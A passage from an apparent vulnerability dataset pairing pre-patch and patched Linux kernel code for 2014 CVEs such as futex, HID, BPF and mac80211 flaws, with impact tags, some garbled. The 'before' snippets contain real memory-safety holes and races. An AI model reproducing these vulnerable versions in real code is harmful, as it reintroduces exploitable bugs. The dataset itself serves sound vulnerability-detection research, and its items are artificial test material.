		 * value on AMD.  Making the address canonical ensures that
		 * vmentry does not fail on Intel after writing a non-canonical
		 * value, and that something deterministic happens if the guest
		 * invokes 64-bit SYSENTER.
 */
		msr->data = get_canonical(msr->data);
	}
 return kvm_x86_ops->set_msr(vcpu, msr);
}
EXPORT_SYMBOL_GPL(kvm_set_msr);

/*
 * Adapt set_msr() to msr_io()'s calling convention
"
2014,DoS Mem. Corr. ,CVE-2014-3601," return pfn;
}









int kvm_iommu_map_pages(struct kvm *kvm, struct kvm_memory_slot *slot)
{
 gfn_t gfn, end_gfn;
 if (r) {
 printk(KERN_ERR ""kvm_iommu_map_address:""
 ""iommu failed to map pfn=%llx\n"", pfn);

 goto unmap_pages;
		}

 return 0;

unmap_pages:
 kvm_iommu_put_pages(kvm, slot->base_gfn, gfn);
 return r;
}

 return r;
}

static void kvm_unpin_pages(struct kvm *kvm, pfn_t pfn, unsigned long npages)
{
 unsigned long i;

 for (i = 0; i < npages; ++i)
 kvm_release_pfn_clean(pfn + i);
}

static void kvm_iommu_put_pages(struct kvm *kvm,
 gfn_t base_gfn, unsigned long npages)
{
"," return pfn;
}

static void kvm_unpin_pages(struct kvm *kvm, pfn_t pfn, unsigned long npages)
{
 unsigned long i;

 for (i = 0; i < npages; ++i)
 kvm_release_pfn_clean(pfn + i);
}

int kvm_iommu_map_pages(struct kvm *kvm, struct kvm_memory_slot *slot)
{
 gfn_t gfn, end_gfn;
 if (r) {
 printk(KERN_ERR ""kvm_iommu_map_address:""
 ""iommu failed to map pfn=%llx\n"", pfn);
 kvm_unpin_pages(kvm, pfn, page_size);
 goto unmap_pages;
		}

 return 0;

unmap_pages:
 kvm_iommu_put_pages(kvm, slot->base_gfn, gfn - slot->base_gfn);
 return r;
}

 return r;
}









static void kvm_iommu_put_pages(struct kvm *kvm,
 gfn_t base_gfn, unsigned long npages)
{
"
2014,DoS Overflow ,CVE-2014-3535," return dev->name;
}

#define netdev_printk(level, netdev, format, args...)		\
 dev_printk(level, (netdev)->dev.parent,			\
		   ""%s: "" format,				\
		   netdev_name(netdev), ##args)

#define netdev_emerg(dev, format, args...)			\
 netdev_printk(KERN_EMERG, dev, format, ##args)
#define netdev_alert(dev, format, args...)			\
 netdev_printk(KERN_ALERT, dev, format, ##args)
#define netdev_crit(dev, format, args...)			\
 netdev_printk(KERN_CRIT, dev, format, ##args)
#define netdev_err(dev, format, args...)			\
 netdev_printk(KERN_ERR, dev, format, ##args)
#define netdev_warn(dev, format, args...)			\
 netdev_printk(KERN_WARNING, dev, format, ##args)
#define netdev_notice(dev, format, args...)			\
 netdev_printk(KERN_NOTICE, dev, format, ##args)
#define netdev_info(dev, format, args...)			\
 netdev_printk(KERN_INFO, dev, format, ##args)

#if defined(DEBUG)
#define netdev_dbg(__dev, format, args...)			\
 return buffer;
}































































static void __net_exit netdev_exit(struct net *net)
{
 kfree(net->dev_name_head);
"," return dev->name;
}

extern int netdev_printk(const char *level, const struct net_device *dev,
 const char *format, ...)
	__attribute__ ((format (printf, 3, 4)));
extern int netdev_emerg(const struct net_device *dev, const char *format, ...)
	__attribute__ ((format (printf, 2, 3)));
extern int netdev_alert(const struct net_device *dev, const char *format, ...)
	__attribute__ ((format (printf, 2, 3)));
extern int netdev_crit(const struct net_device *dev, const char *format, ...)
	__attribute__ ((format (printf, 2, 3)));
extern int netdev_err(const struct net_device *dev, const char *format, ...)
	__attribute__ ((format (printf, 2, 3)));
extern int netdev_warn(const struct net_device *dev, const char *format, ...)
	__attribute__ ((format (printf, 2, 3)));
extern int netdev_notice(const struct net_device *dev, const char *format, ...)
	__attribute__ ((format (printf, 2, 3)));
extern int netdev_info(const struct net_device *dev, const char *format, ...)
	__attribute__ ((format (printf, 2, 3)));



#if defined(DEBUG)
#define netdev_dbg(__dev, format, args...)			\
 return buffer;
}

static int __netdev_printk(const char *level, const struct net_device *dev,
 struct va_format *vaf)
{
 int r;

 if (dev && dev->dev.parent)
		r = dev_printk(level, dev->dev.parent, ""%s: %pV"",
 netdev_name(dev), vaf);
 else if (dev)
		r = printk(""%s%s: %pV"", level, netdev_name(dev), vaf);
 else
		r = printk(""%s(NULL net_device): %pV"", level, vaf);

 return r;
}

int netdev_printk(const char *level, const struct net_device *dev,
 const char *format, ...)
{
 struct va_format vaf;
 va_list args;
 int r;

 va_start(args, format);

	vaf.fmt = format;
	vaf.va = &args;

	r = __netdev_printk(level, dev, &vaf);
 va_end(args);

 return r;
}
EXPORT_SYMBOL(netdev_printk);

#define define_netdev_printk_level(func, level)			\
int func(const struct net_device *dev, const char *fmt, ...)	\
{								\
 int r;							\
 struct va_format vaf;					\
 va_list args;						\
								\
 va_start(args, fmt);					\
								\
	vaf.fmt = fmt;						\
	vaf.va = &args;						\
								\
	r = __netdev_printk(level, dev, &vaf);			\
 va_end(args);						\
								\
 return r;						\
}								\
EXPORT_SYMBOL(func);

define_netdev_printk_level(netdev_emerg, KERN_EMERG);
define_netdev_printk_level(netdev_alert, KERN_ALERT);
define_netdev_printk_level(netdev_crit, KERN_CRIT);
define_netdev_printk_level(netdev_err, KERN_ERR);
define_netdev_printk_level(netdev_warn, KERN_WARNING);
define_netdev_printk_level(netdev_notice, KERN_NOTICE);
define_netdev_printk_level(netdev_info, KERN_INFO);

static void __net_exit netdev_exit(struct net *net)
{
 kfree(net->dev_name_head);
"
2014,#NAME?,CVE-2014-3534," unsigned long mask = PSW_MASK_USER;

			mask |= is_ri_task(child) ? PSW_MASK_RI : 0;
 if ((data & ~mask) != PSW_USER_BITS)




 return -EINVAL;
 if ((data & PSW_MASK_EA) && !(data & PSW_MASK_BA))

 return -EINVAL;
		}
		*(addr_t *)((addr_t) &task_pt_regs(child)->psw + addr) = data;

			mask |= is_ri_task(child) ? PSW32_MASK_RI : 0;
 /* Build a 64 bit psw mask from 31 bit mask. */
 if ((tmp & ~mask) != PSW32_USER_BITS)
 /* Invalid psw mask. */
 return -EINVAL;



			regs->psw.mask = (regs->psw.mask & ~PSW_MASK_USER) |
				(regs->psw.mask & PSW_MASK_BA) |
				(__u64)(tmp & mask) << 32;
"," unsigned long mask = PSW_MASK_USER;

			mask |= is_ri_task(child) ? PSW_MASK_RI : 0;
 if ((data ^ PSW_USER_BITS) & ~mask)
 /* Invalid psw mask. */
 return -EINVAL;
 if ((data & PSW_MASK_ASC) == PSW_ASC_HOME)
 /* Invalid address-space-control bits */
 return -EINVAL;
 if ((data & PSW_MASK_EA) && !(data & PSW_MASK_BA))
 /* Invalid addressing mode bits */
 return -EINVAL;
		}
		*(addr_t *)((addr_t) &task_pt_regs(child)->psw + addr) = data;

			mask |= is_ri_task(child) ? PSW32_MASK_RI : 0;
 /* Build a 64 bit psw mask from 31 bit mask. */
 if ((tmp ^ PSW32_USER_BITS) & ~mask)
 /* Invalid psw mask. */
 return -EINVAL;
 if ((data & PSW32_MASK_ASC) == PSW32_ASC_HOME)
 /* Invalid address-space-control bits */
 return -EINVAL;
			regs->psw.mask = (regs->psw.mask & ~PSW_MASK_USER) |
				(regs->psw.mask & PSW_MASK_BA) |
				(__u64)(tmp & mask) << 32;
"
2014,DoS Exec Code Overflow Mem. Corr. ,CVE-2014-3185," dev_dbg(&urb->dev->dev, ""%s - command_info is NULL, exiting.\n"", __func__);
 return;
	}




 if (status) {
 dev_dbg(&urb->dev->dev, ""%s - nonzero urb status: %d\n"", __func__, status);
 if (status != -ENOENT)
 /* These are unsolicited reports from the firmware, hence no
		   waiting command to wakeup */
 dev_dbg(&urb->dev->dev, ""%s - event received\n"", __func__);
	} else if (data[0] == WHITEHEAT_GET_DTR_RTS) {

 memcpy(command_info->result_buffer, &data[1],
						urb->actual_length - 1);
		command_info->command_finished = WHITEHEAT_CMD_COMPLETE;
"," dev_dbg(&urb->dev->dev, ""%s - command_info is NULL, exiting.\n"", __func__);
 return;
	}
 if (!urb->actual_length) {
 dev_dbg(&urb->dev->dev, ""%s - empty response, exiting.\n"", __func__);
 return;
	}
 if (status) {
 dev_dbg(&urb->dev->dev, ""%s - nonzero urb status: %d\n"", __func__, status);
 if (status != -ENOENT)
 /* These are unsolicited reports from the firmware, hence no
		   waiting command to wakeup */
 dev_dbg(&urb->dev->dev, ""%s - event received\n"", __func__);
	} else if ((data[0] == WHITEHEAT_GET_DTR_RTS) &&
		(urb->actual_length - 1 <= sizeof(command_info->result_buffer))) {
 memcpy(command_info->result_buffer, &data[1],
						urb->actual_length - 1);
		command_info->command_finished = WHITEHEAT_CMD_COMPLETE;
"
2014,DoS Overflow ,CVE-2014-3184,"static __u8 *ch_report_fixup(struct hid_device *hdev, __u8 *rdesc,
 unsigned int *rsize)
{
 if (*rsize >= 17 && rdesc[11] == 0x3c && rdesc[12] == 0x02) {
 hid_info(hdev, ""fixing up Cherry Cymotion report descriptor\n"");
		rdesc[11] = rdesc[16] = 0xff;
		rdesc[12] = rdesc[17] = 0x03;
		 *   - change the button usage range to 4-7 for the extra
		 *     buttons
 */
 if (*rsize >= 74 &&
			rdesc[61] == 0x05 && rdesc[62] == 0x08 &&
			rdesc[63] == 0x19 && rdesc[64] == 0x08 &&
			rdesc[65] == 0x29 && rdesc[66] == 0x0f &&
 struct usb_device_descriptor *udesc;
	__u16 bcdDevice, rev_maj, rev_min;

 if ((drv_data->quirks & LG_RDESC) && *rsize >= 90 && rdesc[83] == 0x26 &&
			rdesc[84] == 0x8c && rdesc[85] == 0x02) {
 hid_info(hdev,
 ""fixing up Logitech keyboard report descriptor\n"");
		rdesc[84] = rdesc[89] = 0x4d;
		rdesc[85] = rdesc[90] = 0x10;
	}
 if ((drv_data->quirks & LG_RDESC_REL_ABS) && *rsize >= 50 &&
			rdesc[32] == 0x81 && rdesc[33] == 0x06 &&
			rdesc[49] == 0x81 && rdesc[50] == 0x06) {
 hid_info(hdev,
static __u8 *mr_report_fixup(struct hid_device *hdev, __u8 *rdesc,
 unsigned int *rsize)
{
 if (*rsize >= 30 && rdesc[29] == 0x05 && rdesc[30] == 0x09) {
 hid_info(hdev, ""fixing up button/consumer in HID report descriptor\n"");
		rdesc[30] = 0x0c;
	}
static __u8 *pl_report_fixup(struct hid_device *hdev, __u8 *rdesc,
 unsigned int *rsize)
{
 if (*rsize >= 60 && rdesc[39] == 0x2a && rdesc[40] == 0xf5 &&
			rdesc[41] == 0x00 && rdesc[59] == 0x26 &&
			rdesc[60] == 0xf9 && rdesc[61] == 0x00) {
 hid_info(hdev, ""fixing up Petalynx Maxter Remote report descriptor\n"");
static __u8 *sp_report_fixup(struct hid_device *hdev, __u8 *rdesc,
 unsigned int *rsize)
{
 if (*rsize >= 107 && rdesc[104] == 0x26 && rdesc[105] == 0x80 &&
			rdesc[106] == 0x03) {
 hid_info(hdev, ""fixing up Sunplus Wireless Desktop report descriptor\n"");
		rdesc[105] = rdesc[110] = 0x03;
","static __u8 *ch_report_fixup(struct hid_device *hdev, __u8 *rdesc,
 unsigned int *rsize)
{
 if (*rsize >= 18 && rdesc[11] == 0x3c && rdesc[12] == 0x02) {
 hid_info(hdev, ""fixing up Cherry Cymotion report descriptor\n"");
		rdesc[11] = rdesc[16] = 0xff;
		rdesc[12] = rdesc[17] = 0x03;
		 *   - change the button usage range to 4-7 for the extra
		 *     buttons
 */
 if (*rsize >= 75 &&
			rdesc[61] == 0x05 && rdesc[62] == 0x08 &&
			rdesc[63] == 0x19 && rdesc[64] == 0x08 &&
			rdesc[65] == 0x29 && rdesc[66] == 0x0f &&
 struct usb_device_descriptor *udesc;
	__u16 bcdDevice, rev_maj, rev_min;

 if ((drv_data->quirks & LG_RDESC) && *rsize >= 91 && rdesc[83] == 0x26 &&
			rdesc[84] == 0x8c && rdesc[85] == 0x02) {
 hid_info(hdev,
 ""fixing up Logitech keyboard report descriptor\n"");
		rdesc[84] = rdesc[89] = 0x4d;
		rdesc[85] = rdesc[90] = 0x10;
	}
 if ((drv_data->quirks & LG_RDESC_REL_ABS) && *rsize >= 51 &&
			rdesc[32] == 0x81 && rdesc[33] == 0x06 &&
			rdesc[49] == 0x81 && rdesc[50] == 0x06) {
 hid_info(hdev,
static __u8 *mr_report_fixup(struct hid_device *hdev, __u8 *rdesc,
 unsigned int *rsize)
{
 if (*rsize >= 31 && rdesc[29] == 0x05 && rdesc[30] == 0x09) {
 hid_info(hdev, ""fixing up button/consumer in HID report descriptor\n"");
		rdesc[30] = 0x0c;
	}
static __u8 *pl_report_fixup(struct hid_device *hdev, __u8 *rdesc,
 unsigned int *rsize)
{
 if (*rsize >= 62 && rdesc[39] == 0x2a && rdesc[40] == 0xf5 &&
			rdesc[41] == 0x00 && rdesc[59] == 0x26 &&
			rdesc[60] == 0xf9 && rdesc[61] == 0x00) {
 hid_info(hdev, ""fixing up Petalynx Maxter Remote report descriptor\n"");
static __u8 *sp_report_fixup(struct hid_device *hdev, __u8 *rdesc,
 unsigned int *rsize)
{
 if (*rsize >= 112 && rdesc[104] == 0x26 && rdesc[105] == 0x80 &&
			rdesc[106] == 0x03) {
 hid_info(hdev, ""fixing up Sunplus Wireless Desktop report descriptor\n"");
		rdesc[105] = rdesc[110] = 0x03;
"
2014,DoS Exec Code Overflow ,CVE-2014-3183," if (!out_buf)
 return -ENOMEM;

 if (count < DJREPORT_SHORT_LENGTH - 2)
		count = DJREPORT_SHORT_LENGTH - 2;

	out_buf[0] = REPORT_ID_DJ_SHORT;
"," if (!out_buf)
 return -ENOMEM;

 if (count > DJREPORT_SHORT_LENGTH - 2)
		count = DJREPORT_SHORT_LENGTH - 2;

	out_buf[0] = REPORT_ID_DJ_SHORT;
"
2014,DoS Exec Code Overflow ,CVE-2014-3182," return;
	}

 if ((dj_report->device_index < DJ_DEVICE_INDEX_MIN) ||
	    (dj_report->device_index > DJ_DEVICE_INDEX_MAX)) {
 dev_err(&djrcv_hdev->dev, ""%s: invalid device index:%d\n"",
			__func__, dj_report->device_index);
 return;
	}

 if (djrcv_dev->paired_dj_devices[dj_report->device_index]) {
 /* The device is already known. No need to reallocate it. */
 dbg_hid(""%s: device is already known\n"", __func__);
	 * device (via hid_input_report() ) and return 1 so hid-core does not do
	 * anything else with it.
 */







 spin_lock_irqsave(&djrcv_dev->lock, flags);
 if (dj_report->report_id == REPORT_ID_DJ_SHORT) {
"," return;
	}








 if (djrcv_dev->paired_dj_devices[dj_report->device_index]) {
 /* The device is already known. No need to reallocate it. */
 dbg_hid(""%s: device is already known\n"", __func__);
	 * device (via hid_input_report() ) and return 1 so hid-core does not do
	 * anything else with it.
 */
 if ((dj_report->device_index < DJ_DEVICE_INDEX_MIN) ||
	    (dj_report->device_index > DJ_DEVICE_INDEX_MAX)) {
 dev_err(&hdev->dev, ""%s: invalid device index:%d\n"",
				__func__, dj_report->device_index);
 return false;
	}

 spin_lock_irqsave(&djrcv_dev->lock, flags);
 if (dj_report->report_id == REPORT_ID_DJ_SHORT) {
"
2014,DoS Exec Code Overflow ,CVE-2014-3181," if (size < 4 || ((size - 4) % 9) != 0)
 return 0;
		npoints = (size - 4) / 9;





		msc->ntouches = 0;
 for (ii = 0; ii < npoints; ii++)
 magicmouse_emit_touch(msc, ii, data + ii * 9 + 4);
 if (size < 6 || ((size - 6) % 8) != 0)
 return 0;
		npoints = (size - 6) / 8;





		msc->ntouches = 0;
 for (ii = 0; ii < npoints; ii++)
 magicmouse_emit_touch(msc, ii, data + ii * 8 + 6);
"," if (size < 4 || ((size - 4) % 9) != 0)
 return 0;
		npoints = (size - 4) / 9;
 if (npoints > 15) {
 hid_warn(hdev, ""invalid size value (%d) for TRACKPAD_REPORT_ID\n"",
					size);
 return 0;
		}
		msc->ntouches = 0;
 for (ii = 0; ii < npoints; ii++)
 magicmouse_emit_touch(msc, ii, data + ii * 9 + 4);
 if (size < 6 || ((size - 6) % 8) != 0)
 return 0;
		npoints = (size - 6) / 8;
 if (npoints > 15) {
 hid_warn(hdev, ""invalid size value (%d) for MOUSE_REPORT_ID\n"",
					size);
 return 0;
		}
		msc->ntouches = 0;
 for (ii = 0; ii < npoints; ii++)
 magicmouse_emit_touch(msc, ii, data + ii * 8 + 6);
"
2019,,CVE-2014-3180,,
2014,#NAME?,CVE-2014-3153," struct futex_q *this, *next;

 if (requeue_pi) {







 /*
		 * requeue_pi requires a pi_state, try to allocate it now
		 * without any locks in case it fails.
 if (unlikely(ret != 0))
 goto out_put_key1;










	hb1 = hash_futex(&key1);
	hb2 = hash_futex(&key2);

 if (ret)
 goto out_key2;










 /* Queue the futex_q, drop the hb lock, wait for wakeup. */
 futex_wait_queue_me(hb, &q, to);

"," struct futex_q *this, *next;

 if (requeue_pi) {
 /*
		 * Requeue PI only works on two distinct uaddrs. This
		 * check is only valid for private futexes. See below.
 */
 if (uaddr1 == uaddr2)
 return -EINVAL;

 /*
		 * requeue_pi requires a pi_state, try to allocate it now
		 * without any locks in case it fails.
 if (unlikely(ret != 0))
 goto out_put_key1;

 /*
	 * The check above which compares uaddrs is not sufficient for
	 * shared futexes. We need to compare the keys:
 */
 if (requeue_pi && match_futex(&key1, &key2)) {
		ret = -EINVAL;
 goto out_put_keys;
	}

	hb1 = hash_futex(&key1);
	hb2 = hash_futex(&key2);

 if (ret)
 goto out_key2;

 /*
	 * The check above which compares uaddrs is not sufficient for
	 * shared futexes. We need to compare the keys:
 */
 if (match_futex(&q.key, &key2)) {
		ret = -EINVAL;
 goto out_put_keys;
	}

 /* Queue the futex_q, drop the hb lock, wait for wakeup. */
 futex_wait_queue_me(hb, &q, to);

"
2014,DoS ,CVE-2014-3145," if (skb_is_nonlinear(skb))
 return 0;




 if (A > skb->len - sizeof(struct nlattr))
 return 0;

 if (skb_is_nonlinear(skb))
 return 0;




 if (A > skb->len - sizeof(struct nlattr))
 return 0;

	nla = (struct nlattr *) &skb->data[A];
 if (nla->nla_len > A - skb->len)
 return 0;

	nla = nla_find_nested(nla, X);
"," if (skb_is_nonlinear(skb))
 return 0;

 if (skb->len < sizeof(struct nlattr))
 return 0;

 if (A > skb->len - sizeof(struct nlattr))
 return 0;

 if (skb_is_nonlinear(skb))
 return 0;

 if (skb->len < sizeof(struct nlattr))
 return 0;

 if (A > skb->len - sizeof(struct nlattr))
 return 0;

	nla = (struct nlattr *) &skb->data[A];
 if (nla->nla_len > skb->len - A)
 return 0;

	nla = nla_find_nested(nla, X);
"
2014,DoS ,CVE-2014-3144," if (skb_is_nonlinear(skb))
 return 0;




 if (A > skb->len - sizeof(struct nlattr))
 return 0;

 if (skb_is_nonlinear(skb))
 return 0;




 if (A > skb->len - sizeof(struct nlattr))
 return 0;

	nla = (struct nlattr *) &skb->data[A];
 if (nla->nla_len > A - skb->len)
 return 0;

	nla = nla_find_nested(nla, X);
"," if (skb_is_nonlinear(skb))
 return 0;

 if (skb->len < sizeof(struct nlattr))
 return 0;

 if (A > skb->len - sizeof(struct nlattr))
 return 0;

 if (skb_is_nonlinear(skb))
 return 0;

 if (skb->len < sizeof(struct nlattr))
 return 0;

 if (A > skb->len - sizeof(struct nlattr))
 return 0;

	nla = (struct nlattr *) &skb->data[A];
 if (nla->nla_len > skb->len - A)
 return 0;

	nla = nla_find_nested(nla, X);
"
2014,DoS ,CVE-2014-3122," */
void mlock_vma_page(struct page *page)
{

 BUG_ON(!PageLocked(page));

 if (!TestSetPageMlocked(page)) {
 unsigned int nr_pages;
 struct zone *zone = page_zone(page);


 BUG_ON(!PageLocked(page));

 /*
 BUG_ON(!page || PageAnon(page));

 if (locked_vma) {
 mlock_vma_page(page);   /* no-op if already mlocked */
 if (page == check_page)

				ret = SWAP_MLOCK;









 continue;	/* don't unmap */
		}

"," */
void mlock_vma_page(struct page *page)
{
 /* Serialize with page migration */
 BUG_ON(!PageLocked(page));

 if (!TestSetPageMlocked(page)) {
 unsigned int nr_pages;
 struct zone *zone = page_zone(page);

 /* For try_to_munlock() and to serialize with page migration */
 BUG_ON(!PageLocked(page));

 /*
 BUG_ON(!page || PageAnon(page));

 if (locked_vma) {
 if (page == check_page) {
 /* we know we have check_page locked */
 mlock_vma_page(page);
				ret = SWAP_MLOCK;
			} else if (trylock_page(page)) {
 /*
				 * If we can lock the page, perform mlock.
				 * Otherwise leave the page alone, it will be
				 * eventually encountered again later.
 */
 mlock_vma_page(page);
 unlock_page(page);
			}
 continue;	/* don't unmap */
		}

"
2014,DoS +Priv ,CVE-2014-2889," break;
				}
 if (filter[i].jt != 0) {
 if (filter[i].jf)
						t_offset += is_near(f_offset) ? 2 : 6;
 EMIT_COND_JMP(t_op, t_offset);
 if (filter[i].jf)
 EMIT_JMP(f_offset);
"," break;
				}
 if (filter[i].jt != 0) {
 if (filter[i].jf && f_offset)
						t_offset += is_near(f_offset) ? 2 : 5;
 EMIT_COND_JMP(t_op, t_offset);
 if (filter[i].jf)
 EMIT_JMP(f_offset);
"
2014,DoS Overflow +Priv ,CVE-2014-2851,,
2014,DoS ,CVE-2014-2739,"			   grh, &av->ah_attr);
}

int ib_update_cm_av(struct ib_cm_id *id, const u8 *smac, const u8 *alt_smac)
{
 struct cm_id_private *cm_id_priv;

	cm_id_priv = container_of(id, struct cm_id_private, id);

 if (smac != NULL)
 memcpy(cm_id_priv->av.smac, smac, sizeof(cm_id_priv->av.smac));

 if (alt_smac != NULL)
 memcpy(cm_id_priv->alt_av.smac, alt_smac,
 sizeof(cm_id_priv->alt_av.smac));

 return 0;
}
EXPORT_SYMBOL(ib_update_cm_av);

static int cm_init_av_by_path(struct ib_sa_path_rec *path, struct cm_av *av)
{
 struct cm_device *cm_dev;
 struct rdma_id_private *listen_id, *conn_id;
 struct rdma_cm_event event;
 int offset, ret;
	u8 smac[ETH_ALEN];
	u8 alt_smac[ETH_ALEN];
	u8 *psmac = smac;
	u8 *palt_smac = alt_smac;
 int is_iboe = ((rdma_node_get_transport(cm_id->device->node_type) ==
			RDMA_TRANSPORT_IB) &&
		       (rdma_port_get_link_layer(cm_id->device,
			ib_event->param.req_rcvd.port) ==
			IB_LINK_LAYER_ETHERNET));

	listen_id = cm_id->context;
 if (!cma_check_req_qp_type(&listen_id->id, ib_event))
	ret = conn_id->id.event_handler(&conn_id->id, &event);
 if (ret)
 goto err3;

 if (is_iboe) {
 if (ib_event->param.req_rcvd.primary_path != NULL)
 rdma_addr_find_smac_by_sgid(
				&ib_event->param.req_rcvd.primary_path->sgid,
				psmac, NULL);
 else
			psmac = NULL;
 if (ib_event->param.req_rcvd.alternate_path != NULL)
 rdma_addr_find_smac_by_sgid(
				&ib_event->param.req_rcvd.alternate_path->sgid,
				palt_smac, NULL);
 else
			palt_smac = NULL;
	}
 /*
	 * Acquire mutex to prevent user executing rdma_destroy_id()
	 * while we're accessing the cm_id.
 */
 mutex_lock(&lock);
 if (is_iboe)
 ib_update_cm_av(cm_id, psmac, palt_smac);
 if (cma_comp(conn_id, RDMA_CM_CONNECT) &&
	    (conn_id->id.qp_type != IB_QPT_UD))
 ib_send_cm_mra(cm_id, CMA_CM_MRA_SETTING, NULL, 0);
int ib_send_cm_sidr_rep(struct ib_cm_id *cm_id,
 struct ib_cm_sidr_rep_param *param);

int ib_update_cm_av(struct ib_cm_id *id, const u8 *smac, const u8 *alt_smac);
#endif /* IB_CM_H */
","			   grh, &av->ah_attr);
}


















static int cm_init_av_by_path(struct ib_sa_path_rec *path, struct cm_av *av)
{
 struct cm_device *cm_dev;
 struct rdma_id_private *listen_id, *conn_id;
 struct rdma_cm_event event;
 int offset, ret;










	listen_id = cm_id->context;
 if (!cma_check_req_qp_type(&listen_id->id, ib_event))
	ret = conn_id->id.event_handler(&conn_id->id, &event);
 if (ret)
 goto err3;















 /*
	 * Acquire mutex to prevent user executing rdma_destroy_id()
	 * while we're accessing the cm_id.
 */
 mutex_lock(&lock);


 if (cma_comp(conn_id, RDMA_CM_CONNECT) &&
	    (conn_id->id.qp_type != IB_QPT_UD))
 ib_send_cm_mra(cm_id, CMA_CM_MRA_SETTING, NULL, 0);
int ib_send_cm_sidr_rep(struct ib_cm_id *cm_id,
 struct ib_cm_sidr_rep_param *param);


#endif /* IB_CM_H */
"
2014,DoS ,CVE-2014-2706," rcu_read_unlock();

 spin_lock_init(&sta->lock);

 INIT_WORK(&sta->drv_unblock_wk, sta_unblock);
 INIT_WORK(&sta->ampdu_mlme.work, ieee80211_ba_session_work);
 mutex_init(&sta->ampdu_mlme.mtx);

 skb_queue_head_init(&pending);



 /* Send all buffered frames to the station */
 for (ac = 0; ac < IEEE80211_NUM_ACS; ac++) {
 int count = skb_queue_len(&pending), tmp;
	}

 ieee80211_add_pending_skbs_fn(local, &pending, clear_sta_ps_flags, sta);


 /* This station just woke up and isn't aware of our SMPS state */
 if (!ieee80211_smps_is_restrictive(sta->known_smps_mode,
 * @drv_unblock_wk: used for driver PS unblocking
 * @listen_interval: listen interval of this station, when we're acting as AP
 * @_flags: STA flags, see &enum ieee80211_sta_info_flags, do not use directly

 * @ps_tx_buf: buffers (per AC) of frames to transmit to this station
 *	when it leaves power saving state or polls
 * @tx_filtered: buffers (per AC) of frames we already tried to
 /* use the accessors defined below */
 unsigned long _flags;

 /*
	 * STA powersave frame queues, no more than the internal
	 * locking required.
 */
 struct sk_buff_head ps_tx_buf[IEEE80211_NUM_ACS];
 struct sk_buff_head tx_filtered[IEEE80211_NUM_ACS];
 unsigned long driver_buffered_tids;
		       sta->sta.addr, sta->sta.aid, ac);
 if (tx->local->total_ps_buffered >= TOTAL_MAX_TX_BUFFER)
 purge_old_ps_buffers(tx->local);














 if (skb_queue_len(&sta->ps_tx_buf[ac]) >= STA_MAX_TX_BUFFER) {
 struct sk_buff *old = skb_dequeue(&sta->ps_tx_buf[ac]);
 ps_dbg(tx->sdata,
		info->flags |= IEEE80211_TX_INTFL_NEED_TXPROCESSING;
		info->flags &= ~IEEE80211_TX_TEMPORARY_FLAGS;
 skb_queue_tail(&sta->ps_tx_buf[ac], tx->skb);


 if (!timer_pending(&local->sta_cleanup))
 mod_timer(&local->sta_cleanup,
"," rcu_read_unlock();

 spin_lock_init(&sta->lock);
 spin_lock_init(&sta->ps_lock);
 INIT_WORK(&sta->drv_unblock_wk, sta_unblock);
 INIT_WORK(&sta->ampdu_mlme.work, ieee80211_ba_session_work);
 mutex_init(&sta->ampdu_mlme.mtx);

 skb_queue_head_init(&pending);

 /* sync with ieee80211_tx_h_unicast_ps_buf */
 spin_lock(&sta->ps_lock);
 /* Send all buffered frames to the station */
 for (ac = 0; ac < IEEE80211_NUM_ACS; ac++) {
 int count = skb_queue_len(&pending), tmp;
	}

 ieee80211_add_pending_skbs_fn(local, &pending, clear_sta_ps_flags, sta);
 spin_unlock(&sta->ps_lock);

 /* This station just woke up and isn't aware of our SMPS state */
 if (!ieee80211_smps_is_restrictive(sta->known_smps_mode,
 * @drv_unblock_wk: used for driver PS unblocking
 * @listen_interval: listen interval of this station, when we're acting as AP
 * @_flags: STA flags, see &enum ieee80211_sta_info_flags, do not use directly
 * @ps_lock: used for powersave (when mac80211 is the AP) related locking
 * @ps_tx_buf: buffers (per AC) of frames to transmit to this station
 *	when it leaves power saving state or polls
 * @tx_filtered: buffers (per AC) of frames we already tried to
 /* use the accessors defined below */
 unsigned long _flags;

 /* STA powersave lock and frame queues */
 spinlock_t ps_lock;


 struct sk_buff_head ps_tx_buf[IEEE80211_NUM_ACS];
 struct sk_buff_head tx_filtered[IEEE80211_NUM_ACS];
 unsigned long driver_buffered_tids;
		       sta->sta.addr, sta->sta.aid, ac);
 if (tx->local->total_ps_buffered >= TOTAL_MAX_TX_BUFFER)
 purge_old_ps_buffers(tx->local);

 /* sync with ieee80211_sta_ps_deliver_wakeup */
 spin_lock(&sta->ps_lock);
 /*
		 * STA woke up the meantime and all the frames on ps_tx_buf have
		 * been queued to pending queue. No reordering can happen, go
		 * ahead and Tx the packet.
 */
 if (!test_sta_flag(sta, WLAN_STA_PS_STA) &&
		    !test_sta_flag(sta, WLAN_STA_PS_DRIVER)) {
 spin_unlock(&sta->ps_lock);
 return TX_CONTINUE;
		}

 if (skb_queue_len(&sta->ps_tx_buf[ac]) >= STA_MAX_TX_BUFFER) {
 struct sk_buff *old = skb_dequeue(&sta->ps_tx_buf[ac]);
 ps_dbg(tx->sdata,
		info->flags |= IEEE80211_TX_INTFL_NEED_TXPROCESSING;
		info->flags &= ~IEEE80211_TX_TEMPORARY_FLAGS;
 skb_queue_tail(&sta->ps_tx_buf[ac], tx->skb);
 spin_unlock(&sta->ps_lock);

 if (!timer_pending(&local->sta_cleanup))
 mod_timer(&local->sta_cleanup,
"
2014,DoS ,CVE-2014-2678,,
2014,DoS ,CVE-2014-2673," flush_altivec_to_thread(src);
 flush_vsx_to_thread(src);
 flush_spe_to_thread(src);










	*dst = *src;

"," flush_altivec_to_thread(src);
 flush_vsx_to_thread(src);
 flush_spe_to_thread(src);
 /*
	 * Flush TM state out so we can copy it.  __switch_to_tm() does this
	 * flush but it removes the checkpointed state from the current CPU and
	 * transitions the CPU out of TM mode.  Hence we need to call
	 * tm_recheckpoint_new_task() (on the same task) to restore the
	 * checkpointed state back and the TM mode.
 */
 __switch_to_tm(src);
 tm_recheckpoint_new_task(src);

	*dst = *src;

"
2014,DoS ,CVE-2014-2672," for (tidno = 0, tid = &an->tid[tidno];
	     tidno < IEEE80211_NUM_TIDS; tidno++, tid++) {

 if (!tid->sched)
 continue;

		ac = tid->ac;
		txq = ac->txq;

 ath_txq_lock(sc, txq);






		buffered = ath_tid_has_buffered(tid);

		tid->sched = false;
"," for (tidno = 0, tid = &an->tid[tidno];
	     tidno < IEEE80211_NUM_TIDS; tidno++, tid++) {




		ac = tid->ac;
		txq = ac->txq;

 ath_txq_lock(sc, txq);

 if (!tid->sched) {
 ath_txq_unlock(sc, txq);
 continue;
		}

		buffered = ath_tid_has_buffered(tid);

		tid->sched = false;
"
